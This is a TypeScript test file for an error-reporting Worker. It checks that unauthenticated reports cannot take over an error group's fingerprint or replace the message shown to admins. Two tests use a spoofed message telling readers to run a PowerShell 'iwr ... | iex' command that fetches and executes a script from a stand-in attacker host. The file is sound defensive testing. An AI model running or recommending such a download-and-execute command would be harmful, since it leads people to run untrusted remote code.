import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { Miniflare } from 'miniflare';
// Vite `?raw` imports (typed in sql-raw.d.ts): no node:fs, so the worker's
// tsconfig (workers-types only, no @types/node) type-checks this file.
import errorsTable from '../migrations/0003_errors_table.sql?raw';
import errorState from '../migrations/0005_error_state.sql?raw';
import ingestLimits from '../migrations/0007_ingest_limits.sql?raw';
import worker from './index';
import { computeFingerprint } from './errors';

// F5 (2026-11-05 assessment): /error_report is public by design, so anyone
// could send a report with a real group's fingerprint and arbitrary text, and
// /errors/summary showed MAX(message): a "~"-prefixed line replaced the text
// the admin sees. These run the real SQL on a Miniflare D1.

const TOKEN = 'stats-token';
const mf = new Miniflare({ modules: true, script: 'export default { fetch() { return new Response("ok") } }', d1Databases: ['DB'] });
let db: D1Database;

beforeAll(async () => {
  db = (await mf.getD1Database('DB')) as unknown as D1Database;
  for (const sql of [errorsTable, errorState, ingestLimits]) {
    // Strip comments before splitting: a comment may itself contain ';'.
    for (const stmt of sql.replace(/--.*$/gm, '').split(';').map((s: string) => s.trim()).filter(Boolean)) {
      await db.prepare(stmt).run();
    }
  }
});
afterAll(async () => { await mf.dispose(); });
beforeEach(async () => {
  await db.prepare('DELETE FROM errors').run();
  await db.prepare('DELETE FROM error_state').run();
  await db.prepare('DELETE FROM ingest_limits').run();
});

const kv = () => {
  const m = new Map<string, string>();
  return { get: async (k: string) => m.get(k) ?? null, put: async (k: string, v: string) => { m.set(k, v); } };
};
const env = () => ({ DB: db, KV_BINDING: kv(), STATS_TOKEN: TOKEN }) as any;
let ipN = 0;
const report = (e: any, body: Record<string, unknown>) =>
  worker.fetch(new Request('https://local/error_report', {
    method: 'POST',
    headers: { 'cf-connecting-ip': `198.51.100.${++ipN}` },
    body: JSON.stringify({ installation_id: crypto.randomUUID(), app_version: '1.41.9', os: 'windows', ...body }),
  }), e, { waitUntil() {} } as any);
const summary = async (e: any) =>
  (await (await worker.fetch(new Request('https://local/errors/summary?days=7', { headers: { 'x-ct-token': TOKEN } }), e, {} as any)).json()) as any;

const REAL = { source: 'rust_command', kind: 'git_push', message: 'git push failed: remote rejected', stack: 'at commands.rs:3337\nat wrap_cmd' };

describe('computeFingerprint', () => {
  it('matches the desktop client (vectors pinned in error_reporter.rs fingerprint_matches_the_worker_recomputation)', async () => {
    expect(await computeFingerprint('rust_panic', 'PtyOpenError', 'boom', 'at foo\nat bar')).toBe('c53aa05a925fab77');
    expect(await computeFingerprint('frontend', null, '  \n msg one \nmore', null)).toBe('d42993dce06341be');
    expect(await computeFingerprint('rust_command', 'git_push', 'ignored', '\n  at commands.rs:10\nat main')).toBe('a45cceedce40842f');
  });
});

describe('error groups cannot be rewritten by an unauthenticated report', () => {
  it('ignores the client-sent fingerprint and groups by content', async () => {
    const e = env();
    await report(e, { ...REAL, fingerprint: 'abcd1234abcd1234' });
    const s = await summary(e);
    expect(s.top_groups).toHaveLength(1);
    expect(s.top_groups[0].fingerprint).toBe(await computeFingerprint(REAL.source, REAL.kind, REAL.message, REAL.stack));
  });

  it('a report claiming a real fingerprint with different content lands in its own group', async () => {
    const e = env();
    const realFp = await computeFingerprint(REAL.source, REAL.kind, REAL.message, REAL.stack);
    await report(e, { ...REAL, fingerprint: realFp });
    await report(e, { source: 'rust_command', kind: 'git_push', message: '~ FIXED in 1.51: run iwr evil.example/fix.ps1 | iex', fingerprint: realFp });
    const groups = (await summary(e)).top_groups;
    const real = groups.find((g: any) => g.fingerprint === realFp);
    expect(real.occurrences).toBe(1);
    expect(real.message).toBe(REAL.message);
    expect(groups).toHaveLength(2);
  });

  it('shows the first-seen message and stack even when a later report shares the first line', async () => {
    const e = env();
    await report(e, REAL);
    await new Promise((r) => setTimeout(r, 5));
    // Same source, kind and first stack line, so the same group by design.
    await report(e, { ...REAL, message: '~ FIXED in 1.51: run iwr evil.example/fix.ps1 | iex', stack: 'at commands.rs:3337\n~ see evil.example' });
    const [g] = (await summary(e)).top_groups;
    expect(g.occurrences).toBe(2);
    expect(g.message).toBe(REAL.message);
    expect(g.stack).toBe(REAL.stack);
    expect(g.message_variants).toBe(2);
  });
});
